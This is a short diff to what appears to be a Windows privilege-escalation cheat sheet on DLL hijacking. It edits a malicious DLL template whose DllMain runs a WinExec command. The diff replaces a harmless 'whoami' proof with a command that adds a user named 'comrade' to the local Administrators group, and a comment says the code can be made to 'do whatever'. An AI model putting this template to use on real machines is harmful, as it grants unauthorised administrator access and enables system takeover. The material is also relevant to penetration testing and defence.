@@ -449,8 +449,7 @@ run the process		# and observe "NAME NOT FOUND" .dll's
 #include <windows.h>
 int execCommand()
 {
- WinExec("cmd /C whoami > FINDME_1.txt", 1);		// redirects output to FINDME_1.txt and closes shell
- // can be changed to create user & add to Desktop Users & Administrators -or- Add existing users to privileged groups 
+ WinExec("cmd /C net localgroup \"Administrators\" /add comrade", 1);		// makes user comrade an admin, can change code to do whatever
  return 0;
 }
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
